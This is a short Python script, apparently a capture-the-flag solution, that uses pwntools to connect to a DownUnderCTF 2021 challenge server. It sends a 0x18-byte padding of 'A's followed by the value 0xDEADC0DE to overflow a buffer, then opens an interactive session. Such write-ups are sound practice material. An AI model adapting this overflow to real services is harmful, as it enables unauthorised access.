from pwn import *

s = remote('pwn-2021.duc.tf', 31916)

s.sendline(b'A' * 0x18 + p32(0xDEADC0DE))

s.interactive()
